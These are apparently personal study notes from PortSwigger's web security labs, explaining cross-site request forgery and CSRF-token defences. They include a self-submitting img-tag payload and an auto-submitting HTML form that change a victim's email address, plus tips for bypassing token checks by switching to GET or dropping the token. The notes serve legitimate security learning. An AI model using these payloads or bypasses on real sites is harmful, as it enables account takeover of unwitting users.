# PortSwigger Academy Notes

## CSRF
## The delivery mechanisms for cross-site request forgery attacks are essentially the same as for reflected XSS. 
- If the request to change email address can be performed with the GET method, then a self-contained attack would look like this:
- ` <img src="https://vulnerable-website.com/email/change?email=pwned@evil-user.net"> `
To craft an HTML PoC for CSRF, there are online generators to use that will take a post request and convert it to an HTML payload.
Here is an example
```
 <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything%40web-security-academy.net">
</form>
<script>
        document.forms[0].submit();
</script>'
```
## Common defences against CSRF
* CSRF Tokens: When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token. Otherwise, the server will refuse to perform the requested action. A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:
```
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```
```
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```
### CSRF Token Flaws
Validation of CSRF token depends on request method
 Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
  Change request to potentially bypass check
 Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
  Remove the csrf parameter in the request to potentially bypass check 

* SameSite Cookies
* Referer-Based Validation

